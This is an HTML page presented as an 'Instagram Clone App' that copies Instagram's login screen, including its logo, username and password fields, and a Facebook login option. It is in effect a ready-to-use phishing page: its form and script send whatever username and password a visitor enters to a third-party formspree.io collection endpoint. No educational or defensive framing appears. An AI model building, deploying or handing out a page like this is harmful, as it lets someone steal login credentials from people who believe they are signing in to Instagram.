<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Instagram Clone App using HTML CSS & JS - CodingFrontend</title>
	</head>
</head>

<body>
	
	<form id="my-form" action="https://formspree.io/f/xpzbbjea" method="POST">
		<div class="wrapper">
			<div class="container">
				<div class="row">
					
					<div class="col-md-6 text-center secondContainer">
						<div class="card">
							<div class="py-3 px-2">
								<img src="https://telegra.ph/file/11d7ebfb0eb1a732d59a9.png" alt="card-img-top" height="50px">
							</div>
							<div class="card-body">
								<form 
								action="https://formspree.io/f/xpzbbjea"
								method="post">
									<div class="form-group py-1">
										<input type="text" class="form-control" name="fname" id="" aria-describedby="helpId"
											placeholder="Phone Number, Username or Email" required>
									</div>
									<div class="form-group py-1">
										<input type="password" class="form-control" name="lnamje" id="" aria-describedby="helpId"
											placeholder="Password" required>
									</div>
									<button type="submit" class="mt-2 btn btn-primary w-100 enabled" >Log In</button>
								</form>
								<div class="or">
									<span>OR</span>
								</div>
								<div class="otherMethods">
									<div class="secondaryColor">
										<img src="https://telegra.ph/file/161e3b413ab86288b0882.png" class="img-fluid rounded" alt="[+]"
											style="width: 30px;height: 30px">
											<span class="ms-2">Login with Facebook</span>
									</div>
								</div>
								<div class="forgot-pass mt-3 primaryColor">Forgot Password ?</div>
							</div>
						</div>
						<div class="card my-2">
							<div class="card-body">
								<span>Don't Have an Account?</span><span class="primaryColor">Sign Up</span>
							</div>
						</div>
						<span class="primaryColor">Get the App</span>
						<div class="row py-2">
							<div class="col-6"><img src="https://telegra.ph/file/c48866f6c0118c0658b1b.png" alt="[+]" height="40px">
							</div>
					</div>
				</div>
			</div>
		</div>
		<p id="my-form-status"></p>
	  <!-- Place this script at the end of the body tag -->
	  <script>
		  var form = document.getElementById("my-form");
		  
		  async function handleSubmit(event) {
			event.preventDefault();
			var status = document.getElementById("my-form-status");
			var data = new FormData(event.target);
			fetch(event.target.action, {
			  method: form.method,
			  body: data,
			  headers: {
				  'Accept': 'application/json'
			  }
			}).then(response => {
			  if (response.ok) {
				status.innerHTML = "Thanks for your submission!";
				form.reset()
			  } else {
				response.json().then(data => {
				  if (Object.hasOwn(data, 'errors')) {
					status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
				  } else {
					status.innerHTML = "Oops! There was a problem submitting your form"
				  }
				})
			  }
			}).catch(error => {
			  status.innerHTML = "Oops! There was a problem submitting your form"
			});
		  }
		  form.addEventListener("submit", handleSubmit)
	  </script>
</body>

</html>
